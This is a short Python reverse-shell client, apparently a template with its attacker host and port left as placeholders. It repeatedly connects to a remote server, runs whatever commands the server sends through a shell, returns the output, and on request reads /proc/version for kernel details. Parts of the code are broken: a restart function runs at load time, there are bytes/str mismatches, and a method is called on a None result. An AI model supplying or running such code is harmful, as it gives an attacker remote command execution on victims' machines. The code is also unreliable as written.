import socket
import subprocess
import os
import sys

s = socket.socket()
n = '\n'
n = n.encode()

def program_restart():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()

pf = program_restart()

def try_connect():
    while True:
        try:
            print("[i] T6Y1NG 70 C0NN3C7...") # Debug only
            s.connect(('{}', {}))
            break

        except ConnectionRefusedError:
            pass

        except:
            pass

try_connect()
while True:
    try:
        print("[i] W3 463 N0W C0NN3C73D 70 7H3 S36V36!") # Debug only
        cmd = s.recv(1024)
        if cmd[:2] == 'cd':
            os.chdir(cmd[3:])
            dir = os.getcwd()
            s.sendall('bacod')
    
        elif cmd == 'kernel_info':
            results = subprocess.Popen('cat /proc/version', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            try:
                s.sendall(results)

            except:
                pf.program_restart()
    
        else:
            results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            try:
                s.sendall(n+results)

            except:
                pf.program_restart()

    except(BrokenPipeError, OSError):
        pf.program_restart()

    except:
        pf.program_restart()
